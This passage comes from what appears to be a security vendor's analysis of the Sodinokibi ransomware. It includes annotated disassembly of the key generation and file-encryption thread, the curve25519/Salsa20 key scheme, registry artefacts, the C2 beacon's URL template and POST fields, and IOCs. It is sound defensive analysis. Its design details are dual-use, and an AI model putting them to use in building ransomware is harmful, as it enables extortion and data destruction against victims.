.text:00402446&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp; ebx, eax<br> .text:00402448&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; lea&nbsp;&nbsp;&nbsp;&nbsp; eax, [ebp+encprivkey_metadata_2_len]<br> .text:0040244B&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; push&nbsp;&nbsp;&nbsp; eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; out_len<br> .text:0040244C&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; push&nbsp;&nbsp;&nbsp; edi&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; data_len<br> .text:0040244D&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;lea&nbsp;&nbsp;&nbsp;&nbsp; eax, [ebp+victim_main_privkey]<br> .text:00402453&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; push&nbsp;&nbsp;&nbsp; eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; datain<br> .text:00402454&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; push&nbsp;&nbsp;&nbsp; offset master_pubkey<br> .text:00402459&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; call&nbsp;&nbsp;&nbsp; curve25519_aes_encrypt ;<br> .text:00402459&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;; generate victim's tertiary key pair and derive<br> .text:00402459&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; key for AES-256-CTR encryption using curve25519<br> .text:00402459&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; with priv key from this pair &amp; pub key from .data<br> .text:0040245E&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp; esi, eax<br> .text:00402460&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; lea&nbsp;&nbsp;&nbsp;&nbsp; eax, [ebp+victim_main_privkey]<br> .text:00402466&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; push&nbsp;&nbsp;&nbsp; edi<br> .text:00402467&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; push&nbsp;&nbsp;&nbsp; eax.text:00402468&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;call&nbsp;&nbsp;&nbsp; memset_zero&nbsp;&nbsp;&nbsp;&nbsp; ; remove victim's main private key from memory</td> </tr></tbody></table> <p><i>Figure 19: Victim's key generation</i></p> <p>Sodinokibi uses an AES-based PRNG algorithm to generate a random extension that will be added to the encrypted files. It also generates a unique victim ID by combining the hash of the value returned by <b>CPUID </b>instruction with the volume serial number.</p> <p>It then gathers system information (such as username, computer name, TCP/IP domain, OS version and language, CPU architecture, and disk free space) and encrypts it using the same algorithm as for the private key encryption (except in this case yet another hardcoded public key from the <b>.data</b> section is used for AES key derivation).</p> <p>The following information is saved under either <b>HKLM\SOFTWARE\recfg</b> or <b>HKCU\SOFTWARE\recfg</b> key:</p> <table border="1" cellspacing="0" cellpadding="0" width="720"> <tbody><tr><td width="94" valign="top" bgcolor="#ECECEC"><p><b>Value Name</b></p> </td> <td width="90" valign="top" bgcolor="#ECECEC"><p><b>Type</b></p> </td> <td width="536" valign="top" bgcolor="#ECECEC"><p><b>Content</b></p> </td> </tr><tr><td width="94" valign="top"><p><b>0_key</b></p> </td> <td width="90" valign="top"><p>REG_BIN</p> </td> <td width="536" valign="top"><p>Master key metadata (includes victim’s main private key, encrypted using the AES key derived from the hardcoded key stored in the binary’s <b>.data</b> section)</p> </td> </tr><tr><td width="94" valign="top"><p><b>sk_key</b></p> </td> <td width="90" valign="top"><p>REG_BIN</p> </td> <td width="536" valign="top"><p>Affiliate key metadata (includes the victim’s main private key, encrypted using the AES key derived from the hardcoded key from the config)</p> </td> </tr><tr><td width="94" valign="top"><p><b>pk_key</b></p> </td> <td width="90" valign="top"><p>REG_BIN</p> </td> <td width="536" valign="top"><p>Victim’s main public key</p> </td> </tr><tr><td width="94" valign="top"><p><b>sub_key</b></p> </td> <td width="90" valign="top"><p>REG_BIN</p> </td> <td width="536" valign="top"><p>Attacker's public key from config</p> </td> </tr><tr><td width="94" valign="top"><p><b>stat</b></p> </td> <td width="90" valign="top"><p>REG_BIN</p> </td> <td width="536" valign="top"><p>Victim’s machine information and encryption metadata (encrypted with AES), used as the victim’s key in README file, and for the POST requests</p> </td> </tr><tr><td width="94" valign="top"><p><b>rnd_ext</b></p> </td> <td width="90" valign="top"><p>REG_SZ</p> </td> <td width="536" valign="top"><p>Random extension for encrypted files (&quot;.&quot; + 5-10 alphanumeric characters)</p> </td> </tr></tbody></table> <p><i>Figure 20: Registry values set by Sodinokibi</i></p> <p style="text-align: center;"><img src="/content/dam/blogs-blackberry-com/images/blogs/2019/07/fig21-sodinokibi-sml.png"></p> <p><i>Figure 21: Example registry setup</i></p> <p>To speed up the encryption process, Sodinokibi makes use of IO completion ports – a Windows threading model for processing multiple asynchronous I/O requests on a multiprocessor system:</p> <table border="1" cellspacing="0" cellpadding="0"> <tbody><tr><td width="719" valign="top">.text:00402C76<br> .text:00402C76 ; =============== S U B R O U T I N E =======================================<br> .text:00402C76<br> .text:00402C76 ; Attributes: bp-based frame<br> .text:00402C76<br> .text:00402C76 read_encrypt_write_file_thread proc near<br> .text:00402C76&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;; DATA XREF: encrypt_all_files+C↑o<br> .text:00402C76<br> .text:00402C76 CompletionKey&nbsp;&nbsp; = dword ptr -0Ch<br> .text:00402C76 NumberOfBytesTransferred= dword ptr -8<br> .text:00402C76 Overlapped_then_cryptostruct= dword ptr -4<br> .text:00402C76 CompletionPort&nbsp; = dword ptr&nbsp; 8<br> .text:00402C76<br> .text:00402C76&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; push&nbsp;&nbsp;&nbsp; ebp<br> .text:00402C77&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp; ebp, esp<br> .text:00402C79&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sub&nbsp;&nbsp;&nbsp;&nbsp; esp, 0Ch<br> .text:00402C7C&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; push&nbsp;&nbsp;&nbsp; esi<br> .text:00402C7D&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; call&nbsp;&nbsp;&nbsp; find_explorer_ImpersonateLoggedOnUser<br> .text:00402C82&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp; esi, [ebp+CompletionPort]<br> .text:00402C85&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jmp&nbsp;&nbsp;&nbsp;&nbsp; short GetQueuedCompletionStatus_loop<br> .text:00402C87 ; ---------------------------------------------------------------------------<br> .text:00402C87<br> .text:00402C87 encrypt_files:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; CODE XREF: read_encrypt_write_file_thread+AE↓j<br> .text:00402C87&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; test&nbsp;&nbsp;&nbsp; eax, eax<br> .text:00402C89&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jz&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; short PostQueuedCompletionStatus<br> .text:00402C8B&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp; 0<br> .text:00402C8D&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; push&nbsp;&nbsp;&nbsp; [ebp+NumberOfBytesTransferred]<br> .text:00402C90&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; push&nbsp;&nbsp;&nbsp; [ebp+Overlapped_then_cryptostruct]<br> .text:00402C93&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; call&nbsp;&nbsp;&nbsp; adjust_file_offsets<br> .text:00402C98&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp; ecx, [ebp+Overlapped_then_cryptostruct]<br> .text:00402C9B&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; add&nbsp;&nbsp;&nbsp;&nbsp; esp, 0Ch<br> .text:00402C9E&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp; eax, [ecx+cryptostruct.io_completion_disposition]<br> .text:00402CA4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sub&nbsp;&nbsp;&nbsp;&nbsp; eax, 0<br> .text:00402CA7&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;jz&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; short _0_read_file<br> .text:00402CA9&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sub&nbsp;&nbsp;&nbsp;&nbsp; eax, 1<br> .text:00402CAC&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jz&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; short _1_encrypt_file<br> .text:00402CAE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sub&nbsp;&nbsp;&nbsp;&nbsp; eax, 1<br> .text:00402CB1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jz&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; short _2_write_key_to_file<br> .text:00402CB3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sub&nbsp;&nbsp;&nbsp;&nbsp; eax, 1<br> .text:00402CB6&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jnz&nbsp;&nbsp;&nbsp;&nbsp; short GetQueuedCompletionStatus_loop<br> .text:00402CB8<br> .text:00402CB8 _3_move_file:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; cryptostruct<br> .text:00402CB8&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; push&nbsp;&nbsp;&nbsp; ecx<br> .text:00402CB9&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; push&nbsp;&nbsp;&nbsp; esi&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; CompletionPort<br> .text:00402CBA&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; call&nbsp;&nbsp;&nbsp; do_move_file_add_extension<br> .text:00402CBF&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jmp&nbsp;&nbsp;&nbsp;&nbsp; short next</td> </tr></tbody></table> <p><i>Figure 22: File encryption thread used in IO completion routine</i></p> <p>The algorithm used for file encryption is Salsa20, and a 32-byte Salsa key will be generated for each file using a curve25519-based key derivation algorithm, with the input of the previously generated victim’s public key and a private key from a temporary pair of curve25519 keys generated per file:</p> <p style="text-align: center;"><img src="/content/dam/blogs-blackberry-com/images/blogs/2019/07/fig23-sodinokibi.png"></p> <p><i>Figure 23: Salsa20 key generation using curve22519</i></p> <p>The following information is appended at the end of each encrypted file:<br> <br> •&nbsp; Affiliate key metadata, stored in <b>sk_key</b> in registry (88 bytes):<br> &nbsp; &nbsp; &nbsp; &nbsp; o&nbsp;&nbsp; victim’s main private key, encrypted using AES key derived from the hardcoded key from the config's &quot;pk&quot; value and the victim’s secondary public key (36 bytes)<br> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;o&nbsp;&nbsp; victim’s secondary public key (from a second pair of curve25519 keys, 32 bytes)&nbsp; &nbsp;&nbsp;<br> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;o&nbsp;&nbsp; randomly generated AES IV (16 bytes)<br> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;o&nbsp;&nbsp; CRC32 of victim’s public key (4 bytes)<br> •&nbsp; Master key metadata, stored in&nbsp;<b>0_key</b>&nbsp;in registry (88 bytes):<br> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;o&nbsp;&nbsp; victim’s main private key, encrypted using AES key derived from the hardcoded key from .data section and the victim’s tertiary public key<br> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;o&nbsp;&nbsp; victim’s tertiary public key (from a third pair of curve25519 keys)<br> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;o&nbsp;&nbsp; randomly generated AES IV<br> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;o&nbsp;&nbsp; CRC32 of victim’s public key<br> •&nbsp; Per-file generated public key (32 bytes)<br> •&nbsp; Per-file generated random Salsa20 nonce (8 bytes)<br> •&nbsp; CRC32 sum of per-file public key (4 bytes)<br> •&nbsp; Value of <b>fast</b> setting from config (0 or 1) (4 bytes)<br> •&nbsp; 0x0000 encrypted with per-file generated Salsa20 key (4 bytes)</p> <p style="text-align: center;"><img src="/content/dam/blogs-blackberry-com/images/blogs/2019/07/fig24-sodinokibi.png"></p> <p><i>Figure 24: Information appended to the encrypted file</i></p> <p>All of the generated private keys, AES/Salsa keys, and shared secrets are zeroed-out in memory immediately after use to prevent the possibility of the victim retrieving any information that might help them recover their files.</p> <p>The attackers will be able to decrypt the victim’s main private key by applying the same curve25519 shared-key derivation algorithm to compute the AES key it was encrypted with. In order to do that, the attackers can either use the victim’s secondary public key and their own private key that corresponds to the public key from config's <b>pk</b> value, or use the victim’s tertiary public key and their own private key that corresponds to the public key from the binary's .data section. Having the victim’s main private key and all the metadata appended to the end of each file, they will now be able to derive the Salsa20 symmetric keys used to encrypt the files.</p> <h3>Command and Control (C2) Communication</h3> <p>By using an asymmetric key scheduling algorithm, Sodinokibi doesn’t depend on network communication in order to exchange encryption keys with the attackers. The malware can fully operate in offline mode without the risk of the victim retrieving the information needed for file decryption.</p> <p>It does however implement an optional functionality of reaching out to the C&amp;C – if the <b>net</b> parameter is set in the configuration, a POST request containing the victim’s system information and encryption metadata will be broadcasted to a range of domains listed under the <b>dmn</b> value in the configuration. In most of the samples we saw, that list includes a huge number of legitimate looking domains, most of which seem to be WordPress sites.</p> <p>For each of these domains a pseudo-random URL will be created using the following format:</p> <div style="max-width: 1100.0px; border: 1.0px solid; padding: 10.0px;"><p><br> https://&lt;domain_from_cfg&gt;/&lt;str_from_list1&gt;/&lt;str_from_list2&gt;/&lt;rand_str&gt;.&lt;ext_from_list3&gt;</p> </div> <p><i>Figure 25: Dynamic URL generation template</i></p> <table border="1" cellspacing="0" cellpadding="0"> <tbody><tr><td width="104" valign="top" bgcolor="#ECECEC"><p><b>List 1</b></p> </td> <td width="113" valign="top" bgcolor="#ECECEC"><p><b>List 2</b></p> </td> <td width="104" valign="top" bgcolor="#ECECEC"><p><b>List 3</b></p> </td> </tr><tr><td width="104" valign="top"><p>wp-content</p> </td> <td width="113" valign="top"><p>images</p> </td> <td width="104" valign="top"><p>jpg</p> </td> </tr><tr><td width="104" valign="top"><p>static</p> </td> <td width="113" valign="top"><p>pictures</p> </td> <td width="104" valign="top"><p>png</p> </td> </tr><tr><td width="104" valign="top"><p>content</p> </td> <td width="113" valign="top"><p>image</p> </td> <td width="104" valign="top"><p>gif</p> </td> </tr><tr><td width="104" valign="top"><p>include</p> </td> <td width="113" valign="top"><p>temp</p> </td> <td width="104" valign="top"><p>&nbsp;</p> </td> </tr><tr><td width="104" valign="top"><p>uploads</p> </td> <td width="113" valign="top"><p>tmp</p> </td> <td width="104" valign="top"><p>&nbsp;</p> </td> </tr><tr><td width="104" valign="top"><p>news</p> </td> <td width="113" valign="top"><p>graphic</p> </td> <td width="104" valign="top"><p>&nbsp;</p> </td> </tr><tr><td width="104" valign="top"><p>data</p> </td> <td width="113" valign="top"><p>assets</p> </td> <td width="104" valign="top"><p>&nbsp;</p> </td> </tr><tr><td width="104" valign="top"><p>admin</p> </td> <td width="113" valign="top"><p>pics</p> </td> <td width="104" valign="top"><p>&nbsp;</p> </td> </tr><tr><td width="104" valign="top"><p>&nbsp;</p> </td> <td width="113" valign="top"><p>games</p> </td> <td width="104" valign="top"><p>&nbsp;</p> </td> </tr></tbody></table> <p><i>Figure 26: Extension list used in dynamic URL generation</i></p> <p>An example of a generated URL is shown in Figure 27:</p> <table border="1" cellspacing="0" cellpadding="0"> <tbody><tr><td width="719" valign="top"><p><br> https[://]peppergreenfarmcatering[.]com[.]au/content/pictures/iiusng.jpg</p> </td> </tr></tbody></table> <p><i>Figure 27: Generated URL example</i></p> <p>The POST request sent to each of these URLs contains the <b>stat</b> value from the registry which is made of the following information in JSON format, encrypted with AES-256-CTR with the key generated using curve25519 shared-key derivation algorithm, and SHA3-256:</p> <table border="1" cellspacing="0" cellpadding="0"> <tbody><tr><td width="67" valign="top" bgcolor="#ECECEC"><p><b>Value</b></p> </td> <td width="653" valign="top" bgcolor="#ECECEC"><p><b>Content</b></p> </td> </tr><tr><td width="67" valign="top"><p><b>ver</b></p> </td> <td width="653" valign="top"><p>Malware version (0x102 hardcoded)</p> </td> </tr><tr><td width="67" valign="top"><p><b>pid</b></p> </td> <td width="653" valign="top"><p>Actor ID (&quot;pid&quot; from config)&nbsp;</p> </td> </tr><tr><td width="67" valign="top"><p><b>sub</b></p> </td> <td width="653" valign="top"><p>Campaign ID (&quot;sub&quot; from config)</p> </td> </tr><tr><td width="67" valign="top"><p><b>pk</b></p> </td> <td width="653" valign="top"><p>Attacker's public key (&quot;pk&quot; from config)</p> </td> </tr><tr><td width="67" valign="top"><p><b>uid</b></p> </td> <td width="653" valign="top"><p>Vicitm UID (cpuid_hash + volume_serial_nr)</p> </td> </tr><tr><td width="67" valign="top"><p><b>sk</b></p> </td> <td width="653" valign="top"><p>Content of sk_key value from registry (includes victim’s private key, generated at runtime and encrypted using AES key derived with the use of public key from config)</p> </td> </tr><tr><td width="67" valign="top"><p><b>unm</b></p> </td> <td width="653" valign="top"><p>Username</p> </td> </tr><tr><td width="67" valign="top"><p><b>net</b></p> </td> <td width="653" valign="top"><p>Computer name</p> </td> </tr><tr><td width="67" valign="top"><p><b>grp</b></p> </td> <td width="653" valign="top"><p>TCP/IP domain</p> </td> </tr><tr><td width="67" valign="top"><p><b>lng</b></p> </td> <td width="653" valign="top"><p>OS language</p> </td> </tr><tr><td width="67" valign="top"><p><b>bro</b></p> </td> <td width="653" valign="top"><p>True if keyboard layout code ends with specified codes</p> </td> </tr><tr><td width="67" valign="top"><p><b>os</b></p> </td> <td width="653" valign="top"><p>OS version (ProductName)</p> </td> </tr><tr><td width="67" valign="top"><p><b>bit</b></p> </td> <td width="653" valign="top"><p>CPU architecture</p> </td> </tr><tr><td width="67" valign="top"><p><b>dsk</b></p> </td> <td width="653" valign="top"><p>Disk free space (base64 encoded)</p> </td> </tr><tr><td width="67" valign="top"><p><b>ext</b></p> </td> <td width="653" valign="top"><p>Random file extension for encrypted files</p> </td> </tr></tbody></table> <p><i>Figure 28: POST request custom fields</i></p> <p>The malware will read the response from the C&amp;C, but it does not store it, or use it anywhere in the code, suggesting that its networking functionality is limited to sending out a beacon with the victim’s information.</p> <p>While some of the domains from the configuration might have been waterholed, it’s possible that the majority of them are included just as means of obfuscating the real C&amp;C address.</p> <h2>Conclusions</h2> <p>Our analysis of Sodinokibi revealed several notable and surprising pieces of information. We observed attackers spreading the malware via MSSPs and Go2Assist, as well as using curve22519-based key exchange, perhaps a first for ransomware. We witnessed Sodinokibi transition between 32bit and 64bit operation using the Heaven’s Gate technique, while the C2 server was obfuscated in an impressive list of over a thousand pre-loaded domains.</p> <p>Our investigation also uncovered details about Sodinokibi that invite further speculation. The exploit code is more elegant than the coding of the main ransomware. This may indicate that the exploit code was purchased elsewhere rather than developed by the attackers. We also saw the blue screen of death (BSOD) during testing which may mean the exploit code is not entirely stable, and hence not routinely enabled in many configurations.</p> <p>For those wishing to avoid Sodinokibi attacks, <a href="http://cylance.com/en-us/platform/products/index.html" target="_blank">BlackBerry Cylance</a>&nbsp;trains artificial intelligence-based security agents on millions of both safe and unsafe files. This allows us to identify and prevent Sodinokibi based on countless file attributes and system behaviors instead of a specific file signature. BlackBerry Cylance, which offers a&nbsp;<a href="https://threatvector.cylance.com/en_us/home/cylance-vs-future-threats-the-predictive-advantage.html" target="_blank">predictive advantage</a>&nbsp;over zero-day threats, is effective against both new and legacy cyberattacks.</p> <h2>IOCs</h2> <table border="1" cellspacing="0" cellpadding="0" width="719"> <tbody><tr><td width="489" valign="top" bgcolor="#ECECEC"><p><b>Indicator</b></p> </td> <td width="97" valign="top" bgcolor="#ECECEC"><p><b>Type</b></p> </td> <td width="134" valign="top" bgcolor="#ECECEC"><p><b>Description</b></p> </td> </tr><tr><td width="489"><p>861bc212241bcac9f8095c8de1b180b398057cbb2d37c9220086ffaf24ba9e08</p> </td> <td width="97"><p>SHA256</p> </td> <td width="134"><p>Sodinokibi</p> </td> </tr><tr><td width="489"><p>Global\206D87E0-0E60-DF25-DD8F-8E4E7D1E3BF0</p> </td> <td width="97"><p>Mutex</p> </td> <td width="134"><p>Run-once mutex name</p> </td> </tr><tr><td width="489"><p>Global\48ce5235-506a-49ee-999a-bee908c6aa17</p> </td> <td width="97"><p>Event</p> </td> <td width="134"><p>Exploit mutex name</p> </td> </tr><tr><td width="489" valign="top"><p>[HKLM|HKCU]\SOFTWARE\recfg</p> </td> <td width="97" valign="top"><p>Registry key</p> </td> <td width="134" valign="top"><p>Config registry key</p> </td> </tr><tr><td width="489" valign="top"><p>[HKLM|HKCU]\SOFTWARE\recfg\0_key</p> </td> <td width="97" valign="top"><p>Registry vaue</p> </td> <td width="134" valign="top"><p>Master key metadata</p> </td> </tr><tr><td width="489" valign="top"><p>[HKLM|HKCU]\SOFTWARE\recfg\pk_key</p> </td> <td width="97" valign="top"><p>Registry value</p> </td> <td width="134" valign="top"><p>Victim’s main public key</p> </td> </tr><tr><td width="489" valign="top"><p>[HKLM|HKCU]\SOFTWARE\recfg\sk_key</p> </td> <td width="97" valign="top"><p>Registry value</p> </td> <td width="134" 